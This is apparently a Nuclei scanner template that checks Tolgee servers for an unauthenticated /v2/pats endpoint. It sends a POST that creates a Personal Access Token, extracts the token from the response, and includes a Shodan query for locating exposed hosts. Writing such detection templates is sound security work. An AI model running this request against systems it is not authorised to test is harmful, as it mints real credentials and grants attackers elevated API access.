http:
- extractors:
  - part: body
    regex:
    - '"token"\s*:\s*"([^"]+)"'
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{"token":'
    - '"createdAt"'
  - part: content_type
    type: word
    words:
    - application/hal+json
  - status:
    - 201
    type: status
  matchers-condition: and
  raw:
  - 'POST /v2/pats HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip


    {"description":"{{string}}"}

    '
id: tolgee-api-anonymous
info:
  author: matejsmycka
  description: 'The Tolgee API exposes the `/v2/pats` endpoint without requiring authentication,
    allowing attackers to create Personal Access Tokens (PATs). These tokens can then
    be leveraged to interact with the API and gain elevated privileges.

    '
  metadata:
    max-request: 1
    shodan-query: html:"tolgee"
    verified: true
  name: Tolgee API - Misconfiguration Anonymous Access
  reference:
  - https://docs.tolgee.io/api
  severity: medium
  tags: api,tolgee,misconfig,intrusive,vuln
variables:
  string: '{{to_lower(''{{randstr}}'')}}'
